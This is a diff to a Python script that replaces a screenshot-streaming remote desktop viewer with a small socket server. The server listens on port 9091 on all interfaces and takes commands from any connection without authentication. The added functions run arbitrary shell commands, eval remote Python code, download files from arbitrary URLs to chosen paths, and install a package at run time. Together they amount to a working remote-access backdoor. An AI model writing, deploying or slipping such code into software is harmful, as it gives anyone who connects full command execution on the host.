@@ -1,59 +1,85 @@
+#Imports
 import socket
-
-# Работа с пользователем
-from os import getlogin
-
-# Работа с изображение
-from PIL import Image
-import io
-import numpy as np
-from random import randint
-import pyautogui
-# Поток
-from threading import Thread
-# PyQt5
 import sys
-from PyQt5.QtWidgets import QMainWindow, QApplication, QWidget, QLabel, QPushButton, QAction, QMessageBox
-from PyQt5.QtGui import QPixmap
-from PyQt5.QtCore import QRect, Qt
+import unicodedata
+import subprocess
+from subprocess import PIPE, Popen
+
+#Install libraries
+subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'wget'])
+import wget
+
+#Settings
+port = 9091
+
+#CMDS
+def shellcmd(args):
+    cmd = args[1]
+    output = subprocess.check_output(cmd, shell=True)
+    print(output)
+    return output
+    
+def uploadfilewww(args):
+    url = args[1]
+    location = args[2]
+    wget.download(url,out=location)
+    output = "Downloaded " + url + " to " + location
+    return output
+
+def osname(args):
+    import platform
+    return platform.system()
+
+def listdirectory(args):
+    print("listing directories")
+    dir = args[1]
+    output = "listed directories"
+    return output
+
+def remexec(args):
+    remcode = args[1]
+    output = ""
+    output = eval(remcode)
+    try:
+        output = eval(remcode)
+    except:
+        print("except error in remote exec")
+    print(str(output))
+    return str(output)
+    
+
+#Functions
+#def setup():
 
 
-print("[SERVER]: STARTED")
-sock = socket.socket()
-sock.bind(('localhost', 9091)) # Your Server
-sock.listen()
-conn, addr = sock.accept()
+def executecmd(args):
+    cmd = args[0]
+    print(cmd)
+    targetFunc = globals()[str(cmd)]
+    result = targetFunc(args)
+    return result
 
-class Dekstop(QMainWindow):
-    def __init__(self):
-        super().__init__()
-        self.initUI()
 
-    def ChangeImage(self):
-        try:
-            print("[SERVER]: CONNECTED: {0}!".format(addr[0]))
-            while True:
-                img_bytes = conn.recv(9999999)
-                self.pixmap.loadFromData(img_bytes)
-                self.label.setScaledContents(True)
-                self.label.resize(self.width(), self.height())
-                self.label.setPixmap(self.pixmap)
-        except ConnectionResetError:
-            QMessageBox.about(self, "ERROR", "[SERVER]: The remote host forcibly terminated the existing connection!")
-            conn.close()
 
-    def initUI(self):
-        self.pixmap = QPixmap()
-        self.label = QLabel(self)
-        self.label.resize(self.width(), self.height())
-        self.setGeometry(QRect(pyautogui.size()[0] // 4, pyautogui.size()[1] // 4, 800, 450))
-        self.setFixedSize(self.width(), self.height())
-        self.setWindowTitle("[SERVER] Remote Desktop: " + str(randint(99999, 999999)))
-        self.start = Thread(target=self.ChangeImage, daemon=True)
-        self.start.start()
-
-if __name__ == '__main__':
-    app = QApplication(sys.argv)
-    ex = Dekstop()
-    ex.show()
-    sys.exit(app.exec())
+#Main
+def main():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.bind(("", port))
+        sock.listen(9999)
+        while True:
+            conn, addr = sock.accept()
+            with conn:
+                print('Connected by', addr)
+                while True:
+                    data = conn.recv(1024)
+                    if not data: break
+                    receivedCMD = repr(data)
+                    receivedCMD = receivedCMD[2:-1]
+                    CMDandArgs = receivedCMD.split("|")
+                    print(CMDandArgs)
+                    cmdOut = executecmd(CMDandArgs)
+                    print(cmdOut)
+                    if(cmdOut != ""):
+                        conn.sendall(str(cmdOut).encode("utf-8"))
+            
+main()
